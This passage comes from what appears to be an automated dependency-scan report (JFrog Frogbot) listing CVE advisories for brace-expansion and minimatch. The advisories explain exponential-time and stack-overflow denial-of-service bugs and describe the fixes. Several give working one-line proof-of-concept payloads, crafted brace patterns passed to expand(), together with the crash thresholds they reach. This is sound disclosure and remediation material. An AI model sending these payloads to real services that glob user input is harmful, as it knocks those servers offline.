The fix bounds memory but the algorithm still rebuilds intermediate arrays at
each level (roughly `O(N × maxLength)` work on this input class). A streaming
rewrite that produces output in `O(total output size)` can be a non-urgent
follow-up.

If immediate upgrade isn't possible, avoid passing untrusted input to
`expand()` / glob brace patterns, or pass a small explicit `max` **and**
`maxLength`.<br></details>

<details><summary><b>[ CVE-2026-13149 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 5.3 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.16<br></details> |

### Summary
brace-expansion's expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node's single-threaded event loop, one small input can fully stall a worker/process.

In `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don't use it:
```js
const post = m.post.length ? expand_(m.post, max, false) : [''];   // always recurses
  ...
if (!isSequence && !isOptions) {
  if (m.post.match(/,(?!,).*\}/)) {
    str = m.pre + '{' + m.body + escClose + m.post;
    return expand_(str, max, true); // restart — `post` discarded
  }
  return [str];
}
```

For input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.
Each level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.

The max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.
  
Measured on 5.0.6:

| groups (n) | input bytes | time |
|---|---|---|
| 20 | 60 | 130 ms |
| 24 | 72 | 1.9 s |
| 26 | 78 | 7.8 s |
| 30 (PoC) | 90 | ~2 min |

### Proof of concept
```js
const { expand } = require('brace-expansion');
// 30 non-expanding groups, ~90 bytes — blocks for minutes:
expand('a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}');
```

### Impact

Any application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.

### Remediation

Upgrade to a patched release. The fix:
1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.
1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.

Verified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.

If immediate upgrade isn't possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.<br></details>

<details><summary><b>[ CVE-2026-102278 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.20<br></details> |

### Summary

`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.

This is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.

It is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.

### Two recursion sites

**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:

```js
expand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,907 - about **15.6 KB** of input.

**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:

```js
expand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).

### Why `max` and `maxLength` do not help

Both crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.

Availability only. No code execution, no data exposure.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.

### Patch

A `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.

The default sits far above any realistic nesting depth and well below the crash threshold.<br></details>

<details><summary><b>[ CVE-2026-102276 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.19<br></details> |

### Summary

`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.

This is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.

### Vector 1 - unbounded recursion on `post`

`parseCommaParts()` recursed on the remainder of the string once per brace group:

```js
const postParts = parseCommaParts(post)   // unbounded
```

A brace group containing many comma-separated groups drives one recursion level per group:

```js
expand('{' + '{a},'.repeat(7000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

About 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.

### Vector 2 - `push.apply` with an unbounded array

Even with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:

```js
p.push.apply(p, postParts)
parts.push.apply(parts, p)
```

`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:

```js
expand('{{x},' + 'a,'.repeat(125000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

Threshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.

### Why `max` and `maxLength` do not help

Both crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.

`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.

This is an availability-only issue. No code execution and no data exposure.

### Not a regression

5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.

### Patch

`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.

Equivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.

### Severity note

Scored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).

### Credit

Reported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.<br></details>

<details><summary><b>[ CVE-2022-3517 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary>Fix Version: 3.0.7<br></details> |

A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.<br></details>

---
<div align='center'>

[🐸 JFrog Frogbot](https://jfrog.com/help/r/jfrog-security-user-guide/shift-left-on-security/frogbot)

</div>
